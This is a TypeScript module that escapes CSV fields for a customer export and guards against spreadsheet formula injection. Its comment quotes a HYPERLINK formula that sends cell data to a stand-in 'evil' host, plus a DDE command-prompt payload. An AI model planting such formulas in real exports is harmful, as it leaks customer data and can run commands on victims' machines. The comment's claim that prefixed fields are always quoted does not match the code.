// apps/demo/csv.ts — CSV field/row encoding for GET /customers/export.csv.
//
// Split out of server.ts so apps/demo/test/csv.test.ts can exercise it
// directly, no HTTP or database involved (same reasoning as cardEdit.ts /
// stamp.ts being split out).

/**
 * Wraps `value` in double quotes (doubling any embedded quote) whenever it
 * contains a comma, quote or line break — the minimal RFC 4180 quoting a CSV
 * field needs. A name like `O'Brien, Jr` or one containing a literal `"`
 * must round-trip through this unharmed, not corrupt the file.
 *
 * Also neutralises CSV/DDE formula injection: `custName` and `custPhone`
 * come straight from the public enrol form (BUILD.md §8.16), which caps
 * length but not content, so anyone who scans a card's printed QR can enrol
 * with a name like `=HYPERLINK("https://evil/?x="&A2&B2,"Refund pending")`.
 * Excel (and other spreadsheet apps) treats a cell beginning with `=`, `+`,
 * `-` or `@` as a live formula on open — `-`/`+` reach the same formula
 * engine as `=`, and `=cmd|'/c ...'!A0` is the classic DDE variant that can
 * reach a command prompt on Windows Excel. A tab or carriage return at the
 * start of a field can smuggle a second logical cell past naive parsers for
 * the same reason. OWASP's fix, and the one applied here: prefix a single
 * quote `'` — spreadsheet apps render it as plain text, never evaluate it —
 * and force the field to be quoted so the leading `'` cannot itself be
 * misread as a separate token.
 */
const DANGEROUS_PREFIX_RE = /^[=+\-@\t\r]/;

export function csvField(value: string): string {
  const safe = DANGEROUS_PREFIX_RE.test(value) ? `'${value}` : value;
  if (/[",\r\n]/.test(safe)) {
    return `"${safe.replace(/"/g, '""')}"`;
  }
  return safe;
}

export function csvRow(values: string[]): string {
  return values.map(csvField).join(',');
}
